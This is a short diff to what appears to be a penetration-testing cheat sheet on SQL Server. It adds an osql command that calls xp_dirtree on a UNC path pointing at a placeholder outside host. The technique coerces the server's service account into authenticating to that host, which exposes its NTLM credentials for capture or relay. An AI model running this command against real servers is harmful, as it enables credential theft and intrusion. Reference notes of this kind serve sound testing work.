@@ -51,6 +51,8 @@ Get-SQLInstanceLocal -Verbose
 
 ```
 osql -E -S "localhost\SQLEXPRESS" -Q "select * from master..sysservers" 
+
+osql -S xxx -U username -P password -Q "EXECUTE ('master.sys.xp_dirtree ''\\xxxxxxx@80\a''');"
 ```
 
 
